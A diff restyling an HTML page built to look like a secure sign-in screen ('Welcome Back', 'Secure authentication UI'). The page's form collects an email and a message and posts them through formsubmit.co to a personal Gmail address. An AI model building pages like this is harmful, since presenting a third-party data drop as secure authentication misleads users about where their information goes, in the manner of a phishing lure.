@@ -23,6 +23,7 @@
       justify-content:center;
       align-items:center;
       overflow:hidden;
+      background:#0f172a;
     }
 
     .bg-circle{
@@ -85,18 +86,21 @@
       margin-bottom:28px;
     }
 
-    .input-box{
-      margin-bottom:18px;
+    form{
+      display:flex;
+      flex-direction:column;
+      gap:18px;
     }
 
-    .input-box label{
+    form label{
       display:block;
       margin-bottom:8px;
       font-size:14px;
       color:#e2e8f0;
     }
 
-    .input-box input{
+    form input,
+    form textarea{
       width:100%;
       padding:14px;
       border:none;
@@ -106,14 +110,20 @@
       color:white;
       font-size:15px;
       transition:0.3s;
+      resize:none;
     }
 
-    .input-box input:focus{
+    form input:focus,
+    form textarea:focus{
       background:rgba(255,255,255,0.12);
       box-shadow:0 0 0 2px #3b82f6;
     }
 
-    .btn{
+    form textarea{
+      min-height:120px;
+    }
+
+    button{
       width:100%;
       padding:14px;
       border:none;
@@ -127,7 +137,7 @@
       margin-top:8px;
     }
 
-    .btn:hover{
+    button:hover{
       transform:translateY(-2px);
       opacity:0.95;
     }
@@ -163,16 +173,19 @@
     <h2>Welcome Back</h2>
     <p>Sign in to continue securely</p>
 
-    
-<form action="https://formsubmit.co/creakmc012@gmail.com" method="POST">
-    <label>Email</label>
-    <input type="email" name="email" placeholder="Enter your email" required>
+    <form action="https://formsubmit.co/creakmc012@gmail.com" method="POST">
+      <div>
+        <label>Email</label>
+        <input type="email" name="email" placeholder="Enter your email" required>
+      </div>
 
-    <label>Message</label>
-    <textarea name="message" placeholder="Type your message"></textarea>
+      <div>
+        <label>Message</label>
+        <textarea name="message" placeholder="Type your message"></textarea>
+      </div>
 
-    <button type="submit">Submit</button>
-</form>
+      <button type="submit">Submit</button>
+    </form>
 
     <div class="footer">
       Secure authentication UI 
